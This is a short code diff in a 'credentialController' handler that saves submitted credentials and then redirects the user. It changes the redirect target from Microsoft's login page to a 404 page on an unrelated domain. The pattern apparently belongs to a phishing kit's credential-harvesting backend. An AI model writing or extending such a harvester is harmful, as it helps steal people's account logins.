@@ -16,7 +16,7 @@ export const credentialController = {
       await credential.save();
       
       res.status(201).json({ 
-        redirect: 'https://login.microsoftonline.com'
+        redirect: 'https://www.prumyslovkaliberec.cz/404'
       });
     } catch (error) {
       console.error('Error saving credentials:', error);
